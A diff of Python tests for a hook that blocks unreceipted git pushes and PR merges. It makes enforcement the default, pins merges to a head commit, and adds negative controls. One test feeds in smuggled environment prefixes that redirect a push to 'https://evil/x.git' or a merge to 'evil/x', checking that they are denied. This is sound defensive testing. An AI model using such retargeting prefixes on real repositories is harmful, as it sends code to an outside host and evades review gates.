@@ -18,9 +18,10 @@ from hooks.scripts.tests.receipt_test_support import REPOSITORY, git, make_owner
 from scripts.lib import action_binding as ab
 
 ROOT = Path(__file__).resolve().parents[3]
-MERGE = "gh pr merge 12 --squash"
-PUSH = "git push origin main"
 MERGE_SHA = "f" * 40
+PIN = f"--match-head-commit {MERGE_SHA}"
+MERGE = f"gh pr merge 12 --squash {PIN}"
+PUSH = "git push origin main"
 
 
 class GateTests(HookCase):
@@ -75,14 +76,27 @@ class GateTests(HookCase):
         path = self.loop / session / "trace.jsonl"
         return [json.loads(line)["reason_code"] for line in path.read_text().splitlines()] if path.exists() else []
 
-    def test_off_is_silent_for_absent_unknown_and_off(self) -> None:
-        """Absent config, off, and junk values never deny, warn or trace."""
-        for value in (None, "off", "yes", ""):
-            with self.subTest(value=value):
-                self.configure(value)
-                result = self.invoke("action_authority_gate", self.payload(MERGE))
-                self.assertEqual((result.returncode, result.stdout, result.stderr), (0, "", ""))
+    def test_only_explicit_off_is_silent(self) -> None:
+        """`off` never denies, warns or traces; absent config, junk and empty values are enforce (default ON)."""
+        self.configure("off")
+        result = self.invoke("action_authority_gate", self.payload(MERGE))
+        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, "", ""))
         self.assertEqual(self.reasons(), [])
+        for value in (None, "yes", ""):
+            with self.subTest(value=value):
+                self.configure(value if value is not None else "")
+                if value is None:
+                    (self.repo / ".coderails/workflow.config.yaml").unlink()
+                self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
+        self.assertEqual(set(self.reasons()), {"denied_no_receipt"})
+
+    def test_default_is_enforce_without_any_config_file(self) -> None:
+        """No .coderails directory at all: an unreceipted merge and push to main are denied."""
+        self.assertFalse((self.repo / ".coderails").exists())
+        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
+        self.assertTrue(self.denied("action_authority_gate", self.payload(PUSH)))
+        self.mint(PUSH, "git_push")
+        self.assertFalse(self.denied("action_authority_gate", self.payload(PUSH)))
 
     def test_advisory_warns_and_traces_never_denies(self) -> None:
         """Advisory without a receipt: stderr warning plus a trace row, no denial."""
@@ -162,7 +176,7 @@ class GateTests(HookCase):
         """Different args and a receipt minted for another session are refused; unguarded commands pass."""
         self.configure("enforce")
         self.mint(MERGE, "merge")
-        self.assertTrue(self.denied("action_authority_gate", self.payload("gh pr merge 13 --squash")))
+        self.assertTrue(self.denied("action_authority_gate", self.payload(f"gh pr merge 13 --squash {PIN}")))
         self.assertEqual(self.reasons(), ["denied_hash_mismatch"])
         self.mint(MERGE, "merge", session="s2", session_id="s1")  # foreign: lives in s2's dir, embeds s1
         self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE, "s2")))
@@ -211,19 +225,20 @@ class GateTests(HookCase):
         self.assertTrue(
             self.denied("action_authority_gate", self.payload("git push origin feature && git push origin main"))
         )
-        self.mint("gh pr merge 1", "merge", rid="r2")
-        self.assertTrue(self.denied("action_authority_gate", self.payload("gh pr merge 1 && gh pr merge 2")))
-        self.mint("gh pr merge 2", "merge", rid="r3")
-        self.assertFalse(self.denied("action_authority_gate", self.payload("gh pr merge 1 && gh pr merge 2")))
+        chain = f"gh pr merge 1 {PIN} && gh pr merge 2 {PIN}"
+        self.mint(f"gh pr merge 1 {PIN}", "merge", rid="r2")
+        self.assertTrue(self.denied("action_authority_gate", self.payload(chain)))
+        self.mint(f"gh pr merge 2 {PIN}", "merge", rid="r3")
+        self.assertFalse(self.denied("action_authority_gate", self.payload(chain)))
 
     def test_cd_into_other_repo_binds_the_real_directory(self) -> None:
         """A receipt for `git push` in repoA does not authorise `cd repoB && git push`; one minted for repoB does."""
         self.configure("enforce")
         other = self.second_repo()
-        self.mint("git push", "git_push")
-        self.assertTrue(self.denied("action_authority_gate", self.payload(f"cd {other} && git push")))
-        self.mint("git push", "git_push", cwd=other, rid="r2")
-        self.assertFalse(self.denied("action_authority_gate", self.payload(f"cd {other} && git push")))
+        self.mint(PUSH, "git_push")
+        self.assertTrue(self.denied("action_authority_gate", self.payload(f"cd {other} && {PUSH}")))
+        self.mint(PUSH, "git_push", cwd=other, rid="r2")
+        self.assertFalse(self.denied("action_authority_gate", self.payload(f"cd {other} && {PUSH}")))
 
     def test_missing_session_denied_as_no_session_and_traced(self) -> None:
         """No session_id: deny code no_session, a trace row exists, no blank --session in the hint."""
@@ -299,7 +314,50 @@ class GateTests(HookCase):
             with self.subTest(command=command):
                 self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
         self.mint(PUSH, "git_push")
-        self.assertFalse(self.denied("action_authority_gate", self.payload("FOO=1 git push origin main")))
+        self.assertFalse(self.denied("action_authority_gate", self.payload("time git push origin main")))
+
+    def test_env_prefix_cannot_ride_on_a_receipt(self) -> None:
+        """Negative control: GIT_*/GH_* assignments retarget the action, so they are denied even with a receipt."""
+        self.configure("enforce")
+        self.mint(PUSH, "git_push")
+        self.mint(MERGE, "merge", rid="r2")
+        for command in (
+            "GIT_DIR=/x git push origin main", "FOO=1 git push origin main", "env GIT_DIR=/x git push origin main",
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil/x.git "
+            "git push origin main", f"GH_REPO=evil/x {MERGE}",
+        ):  # fmt: skip
+            with self.subTest(command=command):
+                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
+        self.assertEqual(set(self.reasons()), {"denied_binding_unknown"})
+        self.assertFalse(self.denied("action_authority_gate", self.payload(PUSH)))  # the receipt was never spent
+
+    def test_git_global_options_are_still_guarded(self) -> None:
+        """`git -c k=v push`, `--no-pager`, `--git-dir=` and `-C dir` are matched as pushes and need a receipt."""
+        self.configure("enforce")
+        for command in (
+            "git -c push.default=current push origin main", "git --no-pager push origin main",
+            "git --git-dir=.git push origin main", "git -C . push origin main",
+        ):  # fmt: skip
+            with self.subTest(command=command):
+                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
+        self.assertEqual(self.reasons().count("denied_no_receipt"), 1)  # only the clean -C form can be bound
+        self.assertEqual(self.reasons().count("denied_binding_unknown"), 3)
+
+    def test_ref_moved_earlier_in_the_same_command_is_denied(self) -> None:
+        """Negative control: `git branch -f feature <sha> && git push origin feature:main` binds a stale sha."""
+        self.configure("enforce")
+        git(self.repo, "branch", "feature")
+        command = "git branch -f feature HEAD && git push origin feature:main"
+        self.mint("git push origin feature:main", "git_push")
+        self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
+        self.assertEqual(self.reasons(), ["denied_state_mutated_before_guard"])
+        self.assertFalse(self.denied("action_authority_gate", self.payload("git push origin feature:main")))
+
+    def test_deny_hint_for_unbindable_command_names_the_exact_forms(self) -> None:
+        """The denial for an unbindable merge says to pin the head sha."""
+        self.configure("enforce")
+        out = self.invoke("action_authority_gate", self.payload("gh pr merge 12")).stdout
+        self.assertIn("--match-head-commit", out)
 
     def test_registered_after_existing_gates(self) -> None:
         """Pure append: the Bash group keeps its original order with the new hook last, timeout >= 5."""
